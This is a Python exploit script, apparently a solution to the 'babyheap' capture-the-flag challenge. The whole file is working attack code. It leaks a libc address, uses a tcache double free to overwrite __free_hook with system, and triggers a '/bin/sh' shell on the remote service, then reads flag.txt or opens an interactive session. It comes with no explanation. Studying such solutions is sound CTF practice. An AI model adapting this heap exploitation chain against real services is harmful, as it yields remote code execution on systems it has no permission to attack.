#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import os

bin_file = './babyheap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

default_host = {'host':'target', 'port':4296}

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = default_host, \
                        monitor = {'host':os.environ['CTF4B_HOST'], 'port':int(os.environ['CTF4B_PORT'])} if 'CTF4B_HOST' in os.environ else default_host)
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so', \
                        monitor = 'libc-2.27.so')
env.select('monitor')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stdin   = libc.symbols['_IO_2_1_stdin_']

#==========

def attack(conn, **kwargs):
    conn.recvuntil('> ')
    addr_libc_stdin     = int(conn.recvuntil(' ', drop=True), 16)
    libc.address        = addr_libc_stdin - offset_libc_stdin
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    alloc(conn, 'a'*8)
    delete(conn)
    delete(conn)
    wipe(conn)

    alloc(conn, p64(addr_libc_free_hook))
    wipe(conn)
    alloc(conn, 'b'*8)
    wipe(conn)
    alloc(conn, p64(addr_libc_system))
    wipe(conn)

    alloc(conn, '/bin/sh')
    delete(conn)

def alloc(conn, content):
    conn.sendlineafter('> ', '1')
    conn.sendlineafter(': ', content)

def delete(conn):
    conn.sendlineafter('> ', '2')

def wipe(conn):
    conn.sendlineafter('> ', '3')

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline('echo !!!!!!!!; cat flag.txt')
    conn.recvuntil('!\n')
    print 'FLAG : %s' % conn.recvuntil('\n', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.connection.interactive()
    
#==========
